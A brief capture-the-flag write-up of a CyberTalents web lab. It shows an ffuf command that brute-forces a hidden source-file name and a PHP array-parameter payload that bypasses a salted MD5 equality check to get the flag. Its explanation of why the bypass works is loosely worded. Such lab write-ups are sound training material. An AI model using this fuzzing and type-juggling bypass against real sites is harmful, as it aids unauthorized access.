The page source contained a hidden hint:

```html id="m4q8vx"
<!--FILE=> sourceXXXX -->
<!--XXXX are numbers > 7000 & < 9000 -->
```

I brute-forced the hidden filename using `ffuf`:

```bash id="p7k2ra"
ffuf -u http://cdcamxwl32pue3e6mekgvd1gf9zrq0wz0wkr5cwzo-web.cybertalentslabs.com/sourceFUZZ \
-w <(seq 7000 9000) -fc 404
```

This revealed:

```txt id="x1v9mc"
source8020
```

The source code contained this condition:

```php id="z5m3pa"
$input1 !== $input2 && hash("md5", $salt.$input1) === hash("md5", $salt.$input2)
```

Instead of generating a real MD5 collision, I used a type juggling/array bypass by sending array parameters:

```txt id="t8q4zu"
?n1[]=1&n2[]=2
```
Since both inputs become arrays:

- n1 !== n2 evaluates to true
- both arrays are converted to the same string internally during hashing

This returned the flag.
